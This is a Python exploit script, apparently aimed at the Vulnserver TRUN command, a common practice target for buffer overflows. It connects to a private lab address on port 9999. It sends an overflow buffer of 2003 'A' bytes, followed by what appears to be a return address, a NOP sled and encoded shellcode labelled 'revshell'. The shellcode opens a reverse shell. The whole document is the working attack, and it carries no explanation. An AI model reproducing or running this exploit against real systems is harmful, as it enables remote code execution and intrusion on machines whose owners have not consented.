
#!/usr/bin/python

import socket


s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
s.connect(('192.168.1.4' , 9999))

total = 2984
offset = 2003

buf =  b""
buf += b"\xd9\xcf\xbe\xba\xbf\xaf\x62\xd9\x74\x24\xf4\x5a"
buf += b"\x31\xc9\xb1\x59\x31\x72\x19\x03\x72\x19\x83\xc2"
buf += b"\x04\x58\x4a\x53\x8a\x13\xb5\xac\x4b\x4b\x3f\x49"
buf += b"\x7a\x59\x5b\x19\x2f\x6d\x2f\x4f\xdc\x06\x7d\x64"
buf += b"\xd3\xaf\xc8\xa2\xda\x30\x47\xd8\x34\xff\x98\xb1"
buf += b"\x79\x9e\x64\xc8\xad\x40\x54\x03\xa0\x81\x91\xd5"
buf += b"\xce\x6e\x4f\x6d\x62\x60\x27\xfa\xc1\xbc\xc6\x2c"
buf += b"\x4e\xfc\xb0\x49\x91\x88\x0c\x53\xc2\x20\x06\x1b"
buf += b"\xfa\x4b\x40\xbc\xfb\x98\xf4\x75\x8f\x22\xbe\xb4"
buf += b"\x8f\xd1\x74\x3c\x6e\x33\x45\x82\xb0\x74\xab\xae"
buf += b"\x32\x4d\x8c\x4e\x41\xa5\xee\xf3\x52\x7e\x8c\x2f"
buf += b"\xd6\x60\x36\xbb\x40\x44\xc6\x68\x16\x0f\xc4\xc5"
buf += b"\x5c\x57\xc9\xd8\xb1\xec\xf5\x51\x34\x22\x7c\x21"
buf += b"\x13\xe6\x24\xf1\x3a\xbf\x80\x54\x42\xdf\x6d\x08"
buf += b"\xe6\x94\x9c\x5f\x96\x55\x5f\x60\xca\xc1\x93\xad"
buf += b"\xf5\x11\xbc\xa6\x86\x23\x63\x1d\x01\x0f\xec\xbb"
buf += b"\xd6\x06\xfa\x3b\x08\xa0\x6b\xc2\xa9\xd0\xa2\x01"
buf += b"\xfd\x80\xdc\xa0\x7e\x4b\x1d\x4c\xab\xe1\x17\xda"
buf += b"\x94\x5d\x77\x9a\x7d\x9f\x78\x8b\x21\x16\x9e\xfb"
buf += b"\x89\x78\x0f\xbc\x79\x38\xff\x54\x90\xb7\x20\x44"
buf += b"\x9b\x12\x49\xef\x74\xca\x21\x98\xed\x57\xb9\x39"
buf += b"\xf1\x42\xc7\x7a\x79\x66\x37\x34\x8a\x03\x2b\x21"
buf += b"\xed\xeb\xb3\xb2\x98\xeb\xd9\xb6\x0a\xbc\x75\xb5"
buf += b"\x6b\x8a\xd9\x46\x5e\x89\x1e\xb8\x1f\xbb\x55\x8f"
buf += b"\xb5\x83\x01\xf0\x59\x03\xd2\xa6\x33\x03\xba\x1e"
buf += b"\x60\x50\xdf\x60\xbd\xc5\x4c\xf5\x3e\xbf\x21\x5e"
buf += b"\x57\x3d\x1f\xa8\xf8\xbe\x4a\xaa\xff\x40\x08\x85"
buf += b"\xa7\x28\xf2\x95\x57\xa8\x98\x15\x08\xc0\x57\x39"
buf += b"\xa7\x20\x97\x90\xe0\x28\x12\x75\x42\xc9\x23\x5c"
buf += b"\x02\x57\x23\x53\x9f\x68\x5e\x1c\x20\x89\x9f\x34"
buf += b"\x45\x8a\x9f\x38\x7b\xb7\x49\x01\x09\xf6\x49\x36"
buf += b"\x02\x4d\xef\x1f\x89\xad\xa3\x60\x98"

revshell = buf

shellcode = b"A"*2003 + b"\xaf\x11Pb" + b"\x90" * 16 + revshell
payload = b"TRUN /.:/" + shellcode
s.send(payload)
s.close()
